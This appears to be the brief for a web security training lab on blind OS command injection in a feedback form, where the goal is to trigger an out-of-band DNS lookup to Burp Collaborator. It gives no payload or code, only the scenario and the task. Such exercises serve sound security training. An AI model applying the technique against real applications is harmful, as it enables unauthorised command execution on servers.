Lab: Blind OS command injection with out-of-band interaction

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details.
The command is executed asynchronously and has no effect on the application's response.
It is not possible to redirect output into a location that you can access.
However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.
